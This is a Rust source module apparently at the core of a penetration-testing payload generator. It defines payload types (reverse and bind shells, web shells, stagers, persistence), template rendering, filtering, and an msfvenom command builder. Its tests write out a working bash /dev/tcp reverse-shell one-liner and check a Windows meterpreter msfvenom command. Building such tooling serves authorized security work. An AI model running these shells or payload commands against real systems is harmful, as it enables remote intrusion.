//! Payload generation: reverse/bind shells, web shells, stagers and file-transfer
//! one-liners across many languages, plus an encoding/obfuscation pipeline and an
//! msfvenom command builder. For authorized testing and lab work.

pub mod catalog;
pub mod msf;
pub mod transform;

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Os {
    Linux,
    Windows,
    Macos,
    Any,
}

impl Os {
    pub fn label(self) -> &'static str {
        match self {
            Os::Linux => "linux",
            Os::Windows => "windows",
            Os::Macos => "macos",
            Os::Any => "any",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Kind {
    ReverseShell,
    BindShell,
    WebShell,
    Stager,
    FileTransfer,
    TtyUpgrade,
    Persistence,
}

impl Kind {
    pub fn label(self) -> &'static str {
        match self {
            Kind::ReverseShell => "reverse-shell",
            Kind::BindShell => "bind-shell",
            Kind::WebShell => "web-shell",
            Kind::Stager => "stager",
            Kind::FileTransfer => "file-transfer",
            Kind::TtyUpgrade => "tty-upgrade",
            Kind::Persistence => "persistence",
        }
    }
}

/// The language / runtime the payload is written in — also picks syntax highlighting
/// and the file extension when saved.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Lang {
    Bash,
    Sh,
    Powershell,
    Cmd,
    Python,
    Php,
    Perl,
    Ruby,
    Node,
    Java,
    Jsp,
    Aspx,
    War,
    Golang,
    C,
    Csharp,
    Lua,
    Awk,
    Socat,
    Netcat,
    Ncat,
    Telnet,
    Openssl,
    Vbscript,
    Groovy,
    Html,
}

impl Lang {
    pub fn label(self) -> &'static str {
        use Lang::*;
        match self {
            Bash => "bash",
            Sh => "sh",
            Powershell => "powershell",
            Cmd => "cmd",
            Python => "python",
            Php => "php",
            Perl => "perl",
            Ruby => "ruby",
            Node => "nodejs",
            Java => "java",
            Jsp => "jsp",
            Aspx => "aspx",
            War => "war",
            Golang => "go",
            C => "c",
            Csharp => "csharp",
            Lua => "lua",
            Awk => "awk",
            Socat => "socat",
            Netcat => "nc",
            Ncat => "ncat",
            Telnet => "telnet",
            Openssl => "openssl",
            Vbscript => "vbscript",
            Groovy => "groovy",
            Html => "html",
        }
    }

    pub fn ext(self) -> &'static str {
        use Lang::*;
        match self {
            Bash | Sh | Socat | Netcat | Ncat | Telnet | Openssl => "sh",
            Powershell => "ps1",
            Cmd => "bat",
            Python => "py",
            Php => "php",
            Perl => "pl",
            Ruby => "rb",
            Node => "js",
            Java => "java",
            Jsp => "jsp",
            Aspx => "aspx",
            War => "war",
            Golang => "go",
            C => "c",
            Csharp => "cs",
            Lua => "lua",
            Awk => "awk",
            Vbscript => "vbs",
            Groovy => "groovy",
            Html => "html",
        }
    }

    /// Transforms only make sense for some languages.
    pub fn is_powershell(self) -> bool {
        matches!(self, Lang::Powershell)
    }
}

/// Which slots a template needs filled.
#[derive(Debug, Clone, Copy, Default)]
pub struct Needs {
    pub lhost: bool,
    pub lport: bool,
    pub shell: bool,
    pub path: bool,
}

#[derive(Debug, Clone)]
pub struct Payload {
    pub id: &'static str,
    pub name: &'static str,
    pub os: Os,
    pub kind: Kind,
    pub lang: Lang,
    /// Template with {lhost} {lport} {shell} {path} placeholders.
    pub template: &'static str,
    /// The matching listener command (uses {lport}).
    pub listener: &'static str,
    /// Operator guidance: quoting traps, prerequisites, failure modes.
    pub notes: &'static str,
    /// Transforms that make sense to offer for this payload.
    pub transforms: &'static [transform::Kind],
    pub weight: i32,
}

impl Payload {
    pub fn needs(&self) -> Needs {
        let t = self.template;
        Needs {
            lhost: t.contains("{lhost}"),
            lport: t.contains("{lport}"),
            shell: t.contains("{shell}"),
            path: t.contains("{path}"),
        }
    }

    /// Render the template with the supplied parameters.
    pub fn render(&self, p: &Params) -> String {
        fill(self.template, p)
    }

    pub fn render_listener(&self, p: &Params) -> String {
        fill(self.listener, p)
    }
}

/// Values supplied by the operator.
#[derive(Debug, Clone)]
pub struct Params {
    pub lhost: String,
    pub lport: String,
    pub shell: String,
    pub path: String,
}

impl Default for Params {
    fn default() -> Self {
        Params {
            lhost: "{lhost}".into(),
            lport: "{lport}".into(),
            shell: "/bin/bash".into(),
            path: "/tmp/shell".into(),
        }
    }
}

fn fill(t: &str, p: &Params) -> String {
    t.replace("{lhost}", &p.lhost)
        .replace("{lport}", &p.lport)
        .replace("{shell}", &p.shell)
        .replace("{path}", &p.path)
}

pub fn all() -> &'static [Payload] {
    catalog::REGISTRY
}

pub fn by_id(id: &str) -> Option<&'static Payload> {
    all().iter().find(|p| p.id == id)
}

/// Filter payloads by OS (Any always included) and optional kind, ranked.
pub fn filter(os: Option<Os>, kind: Option<Kind>, lang: Option<Lang>) -> Vec<&'static Payload> {
    let mut v: Vec<&'static Payload> = all()
        .iter()
        .filter(|p| os.is_none_or(|o| p.os == o || p.os == Os::Any || o == Os::Any))
        .filter(|p| kind.is_none_or(|k| p.kind == k))
        .filter(|p| lang.is_none_or(|l| p.lang == l))
        .collect();
    v.sort_by(|a, b| b.weight.cmp(&a.weight).then(a.name.cmp(b.name)));
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bash_devtcp_renders_host_port() {
        let p = by_id("bash-devtcp").unwrap();
        let params = Params {
            lhost: "10.0.0.1".into(),
            lport: "9001".into(),
            ..Default::default()
        };
        let out = p.render(&params);
        assert_eq!(out, "bash -i >& /dev/tcp/10.0.0.1/9001 0>&1");
        assert!(p.render_listener(&params).contains("9001"));
    }

    #[test]
    fn every_template_has_valid_slots_and_transforms() {
        for pl in all() {
            // No stray unreplaced-looking slots beyond the known set.
            let rendered = pl.render(&Params {
                lhost: "H".into(),
                lport: "P".into(),
                shell: "/bin/sh".into(),
                path: "x".into(),
            });
            assert!(!rendered.contains("{lhost}"), "{} leaked lhost", pl.id);
            assert!(!rendered.contains("{lport}"), "{} leaked lport", pl.id);
        }
    }

    #[test]
    fn msf_command_shapes() {
        let s = msf::by_id("win-meterpreter-tcp").unwrap();
        let c = s.command("1.2.3.4", "443", "\\x00", None, 1);
        assert!(c.contains("LHOST=1.2.3.4"));
        assert!(c.contains("LPORT=443"));
        assert!(c.contains("EXITFUNC=thread"));
        assert!(c.contains("-b '\\x00'"));
        assert!(c.contains("-f exe"));
    }
}
